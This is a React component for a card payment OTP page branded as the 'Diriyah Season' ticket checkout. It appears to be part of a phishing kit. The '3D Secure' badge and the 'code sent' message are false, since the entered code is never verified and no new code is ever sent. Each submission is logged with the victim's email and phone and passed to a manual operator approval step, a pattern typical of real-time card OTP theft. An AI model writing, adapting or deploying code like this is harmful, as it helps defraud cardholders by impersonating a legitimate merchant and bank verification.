import { useState, useRef, useEffect, useCallback } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { trackVisitorAction } from "@/hooks/use-visitor-tracking";
import { useToast } from "@/hooks/use-toast";
import { useLanguage } from "@/i18n/LanguageContext";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import WaitingApproval from "@/components/WaitingApproval";
import { Button } from "@/components/ui/button";
import { Separator } from "@/components/ui/separator";
import { ShieldCheck, Lock, RotateCcw, ArrowLeft, ArrowRight, Loader2 } from "lucide-react";
import { playChime } from "@/hooks/use-action-sound";

const OTP_LENGTH = 6;

const CardOTP = () => {
  const { lang } = useLanguage();
  const isAr = lang === "ar";
  const navigate = useNavigate();
  const location = useLocation();
  const { toast } = useToast();

  const state = location.state as {
    tickets?: { id: number; name: string; price: number; qty: number }[];
    email?: string;
    phone?: string;
    total?: number;
    vat?: number;
    subtotal?: number;
    cardLast4?: string;
    cardBrand?: "visa" | "mastercard" | "amex";
    orderId?: string;
  } | null;

  const total = state?.total ?? 0;
  const phone = state?.phone ?? "05XXXXXXXX";
  const cardLast4 = state?.cardLast4 ?? "••••";
  const cardBrand = state?.cardBrand ?? "visa";
  const merchantName = isAr ? "موسم الدرعية" : "Diriyah Season";

  const CardBrandLogo = ({ brand }: { brand: string }) => {
    if (brand === "visa") {
      return (
        <svg viewBox="0 0 48 16" className="h-5 w-auto" fill="none">
          <path d="M19.2 1.6L15.6 14.4H12.4L16 1.6H19.2ZM33.2 9.6L34.8 4.8L35.7 9.6H33.2ZM36.6 14.4H39.6L37 1.6H34.3C33.6 1.6 33 2 32.7 2.6L27.6 14.4H30.8L31.5 12.4H35.4L35.8 14.4H36.6ZM28 9.8C28 6.4 23.2 6.2 23.2 4.6C23.2 4 23.8 3.4 25 3.2C25.6 3.1 27.2 3 29 3.8L29.6 1.8C28.6 1.4 27.4 1 25.8 1C22.8 1 20.6 2.6 20.6 5C20.6 6.8 22.2 7.8 23.4 8.4C24.6 9 25 9.4 25 10C25 10.8 24 11.2 23.2 11.2C21.4 11.2 20.4 10.8 19.6 10.4L19 12.4C19.8 12.8 21.4 13.2 23 13.2C26.2 13.2 28 11.6 28 9.8ZM13 1.6L8 14.4H4.8L2.4 3.8C2.2 3 2.1 2.6 1.4 2.2C0.2 1.6 0 1.4 0 1.4L0 1.2H5C5.8 1.2 6.4 1.8 6.6 2.6L7.6 9L10.8 1.6H13Z" fill="hsl(var(--primary))"/>
        </svg>
      );
    }
    if (brand === "mastercard") {
      return (
        <svg viewBox="0 0 40 24" className="h-5 w-auto">
          <circle cx="14" cy="12" r="10" fill="hsl(0 84% 60%)" opacity="0.9"/>
          <circle cx="26" cy="12" r="10" fill="hsl(36 90% 55%)" opacity="0.9"/>
          <path d="M20 4.6A10 10 0 0 1 24 12a10 10 0 0 1-4 7.4A10 10 0 0 1 16 12a10 10 0 0 1 4-7.4Z" fill="hsl(20 90% 52%)" opacity="0.9"/>
        </svg>
      );
    }
    return (
      <svg viewBox="0 0 40 16" className="h-5 w-auto" fill="none">
        <rect width="40" height="16" rx="2" fill="hsl(var(--primary))"/>
        <text x="20" y="11" textAnchor="middle" fill="hsl(var(--primary-foreground))" fontSize="6" fontWeight="bold" fontFamily="sans-serif">AMEX</text>
      </svg>
    );
  };

  const [otp, setOtp] = useState<string[]>(Array(OTP_LENGTH).fill(""));
  const [timer, setTimer] = useState(60);
  const [verifying, setVerifying] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    inputRefs.current[0]?.focus();
  }, []);

  useEffect(() => {
    if (timer <= 0) return;
    const interval = setInterval(() => setTimer((t) => t - 1), 1000);
    return () => clearInterval(interval);
  }, [timer]);

  const handleChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const digit = value.slice(-1);
    const newOtp = [...otp];
    newOtp[index] = digit;
    setOtp(newOtp);
    if (digit && index < OTP_LENGTH - 1) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, OTP_LENGTH);
    const newOtp = [...otp];
    for (let i = 0; i < pasted.length; i++) {
      newOtp[i] = pasted[i];
    }
    setOtp(newOtp);
    const nextIndex = Math.min(pasted.length, OTP_LENGTH - 1);
    inputRefs.current[nextIndex]?.focus();
  };

   const handleResend = () => {
    setTimer(60);
    setOtp(Array(OTP_LENGTH).fill(""));
    inputRefs.current[0]?.focus();
    toast({
      title: isAr ? "✅ تم إرسال رمز جديد" : "✅ New code sent",
      description: isAr ? "تحقق من رسائلك النصية" : "Check your SMS messages",
    });
  };

  const [waitingForApproval, setWaitingForApproval] = useState(false);

  const handleOtpApproved = useCallback(() => {
    navigate("/order-confirmation", {
      state: {
        tickets: state?.tickets,
        email: state?.email,
        total: state?.total,
        vat: state?.vat,
        subtotal: state?.subtotal,
        paymentMethod: "card",
      },
    });
  }, [navigate, state]);

  const handleOtpRejected = useCallback(() => {
    setWaitingForApproval(false);
    toast({
      title: isAr ? "❌ تم رفض الطلب" : "❌ Request rejected",
      description: isAr ? "يرجى المحاولة مرة أخرى" : "Please try again",
      variant: "destructive",
    });
  }, [isAr, toast]);

  // Guard: no state = show fallback
  if (!state || !state.total) {
    return (
      <div className="min-h-screen bg-background font-body flex flex-col items-center justify-center gap-4 p-6 text-center">
        <p className="text-muted-foreground text-lg">{isAr ? "لا توجد بيانات طلب. يرجى البدء من صفحة التذاكر." : "No order data found. Please start from the tickets page."}</p>
        <button onClick={() => navigate("/tickets")} className="px-6 py-2 bg-primary text-primary-foreground rounded-lg font-medium">{isAr ? "العودة للتذاكر" : "Go to Tickets"}</button>
      </div>
    );
  }

  const handleVerify = async () => {
    const code = otp.join("");
    if (code.length < OTP_LENGTH) {
      toast({
        title: isAr ? "⚠️ أدخل الرمز كاملاً" : "⚠️ Enter complete code",
        description: isAr ? `أدخل ${OTP_LENGTH} أرقام` : `Enter ${OTP_LENGTH} digits`,
        variant: "destructive",
      });
      return;
    }
    setVerifying(true);

    // Update existing order status to pending_otp
    if (state?.orderId) {
      await supabase.from("ticket_orders").update({ status: "pending_otp" } as any).eq("id", state.orderId);
    }

    trackVisitorAction("otp_verified", `تحقق OTP — ${state?.total || 0} ر.س (${state?.email})`, undefined, { email: state?.email, phone: state?.phone });

    playChime("success");

    setTimeout(() => {
      setVerifying(false);
      setWaitingForApproval(true);
    }, 1000);
  };

  const BackArrow = isAr ? ArrowRight : ArrowLeft;
  const isComplete = otp.every((d) => d !== "");

  return (
    <div className="min-h-screen bg-background font-body" dir={isAr ? "rtl" : "ltr"}>
      <Header />

      <main className="pt-28 pb-20 px-4">
        <div className="max-w-md mx-auto">
          {waitingForApproval && state?.orderId ? (
            <div className="bg-card rounded-2xl border border-border p-6 md:p-8 shadow-sm">
              <WaitingApproval
                orderId={state.orderId}
                step="otp"
                onApproved={handleOtpApproved}
                onRejected={handleOtpRejected}
              />
            </div>
          ) : (
          <>
          <button
            onClick={() => navigate(-1)}
            className="flex items-center gap-1.5 text-sm text-muted-foreground hover:text-foreground transition-colors mb-6"
          >
            <BackArrow className="w-4 h-4" />
            <span>{isAr ? "رجوع" : "Back"}</span>
          </button>

          <div className="bg-card rounded-2xl border border-border p-6 md:p-8 shadow-sm">
            {/* Header */}
            <div className="text-center mb-6">
              <div className="w-14 h-14 rounded-2xl bg-primary/10 flex items-center justify-center mx-auto mb-4">
                <Lock className="w-7 h-7 text-primary" />
              </div>
              <h1 className="font-display text-xl font-bold text-foreground mb-1">
                {isAr ? "رمز التحقق" : "Verification Code"}
              </h1>
              <p className="text-sm text-muted-foreground">
                {isAr
                  ? `تم إرسال رمز التحقق إلى رقم جوالك ${phone.slice(0, 4)}****${phone.slice(-2)}`
                  : `A verification code has been sent to ${phone.slice(0, 4)}****${phone.slice(-2)}`}
              </p>
            </div>

            {/* Merchant & Card Info */}
            <div className="bg-primary/5 border border-primary/20 rounded-xl p-4 mb-6 space-y-2.5">
              <div className="flex items-center justify-between">
                <span className="text-sm font-semibold text-foreground">{merchantName}</span>
                <span className="text-xs text-muted-foreground">{isAr ? "التاجر" : "Merchant"}</span>
              </div>
              <Separator className="bg-primary/10" />
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <CardBrandLogo brand={cardBrand} />
                  <span className="text-sm font-mono font-bold text-foreground" dir="ltr">•••• {cardLast4}</span>
                </div>
                <span className="text-xs text-muted-foreground">{isAr ? "البطاقة" : "Card"}</span>
              </div>
              <Separator className="bg-primary/10" />
              <div className="flex items-center justify-between">
                <span className="text-sm font-mono text-foreground" dir="ltr">{phone.slice(0, 4)}****{phone.slice(-2)}</span>
                <span className="text-xs text-muted-foreground">{isAr ? "الجوال" : "Phone"}</span>
              </div>
              <Separator className="bg-primary/10" />
              <div className="flex items-center justify-between">
                <span className="text-lg font-bold text-foreground">
                  {total} <span className="text-xs font-normal text-muted-foreground">{isAr ? "ر.س" : "SAR"}</span>
                </span>
                <span className="text-xs text-muted-foreground">{isAr ? "المبلغ" : "Amount"}</span>
              </div>
            </div>

            {/* OTP Inputs */}
            <div className="flex justify-center gap-2.5 mb-6" dir="ltr" onPaste={handlePaste}>
              {otp.map((digit, i) => (
                <input
                  key={i}
                  ref={(el) => { inputRefs.current[i] = el; }}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleChange(i, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(i, e)}
                  className={`w-12 h-14 text-center text-xl font-bold rounded-xl border-2 bg-background text-foreground outline-none transition-all
                    ${digit ? "border-primary shadow-sm" : "border-border"}
                    focus:border-primary focus:ring-2 focus:ring-primary/20`}
                />
              ))}
            </div>

            {/* Timer & Resend */}
            <div className="text-center mb-6">
              {timer > 0 ? (
                <p className="text-sm text-muted-foreground">
                  {isAr ? "إعادة الإرسال بعد" : "Resend in"}{" "}
                  <span className="font-mono font-bold text-foreground">{timer}</span>{" "}
                  {isAr ? "ثانية" : "sec"}
                </p>
              ) : (
                <button
                  onClick={handleResend}
                  className="inline-flex items-center gap-1.5 text-sm font-medium text-primary hover:text-primary/80 transition-colors"
                >
                  <RotateCcw className="w-3.5 h-3.5" />
                  {isAr ? "إعادة إرسال الرمز" : "Resend Code"}
                </button>
              )}
            </div>

            <Separator className="my-5" />

            <Button
              onClick={handleVerify}
              disabled={!isComplete || verifying}
              className="w-full h-12 text-base font-semibold bg-primary text-primary-foreground hover:bg-primary/90"
            >
              {verifying ? (
                <><Loader2 className="w-4 h-4 me-2 animate-spin" />{isAr ? "جارٍ التحقق..." : "Verifying..."}</>
              ) : (
                isAr ? "تأكيد الدفع" : "Confirm Payment"
              )}
            </Button>

            <div className="flex items-center justify-center gap-1.5 mt-4 text-xs text-muted-foreground">
              <ShieldCheck className="w-3.5 h-3.5" />
              <span>{isAr ? "محمي بتقنية 3D Secure" : "Protected by 3D Secure"}</span>
            </div>
          </div>
          </>
          )}
        </div>
      </main>

      <Footer />
    </div>
  );
};

export default CardOTP;
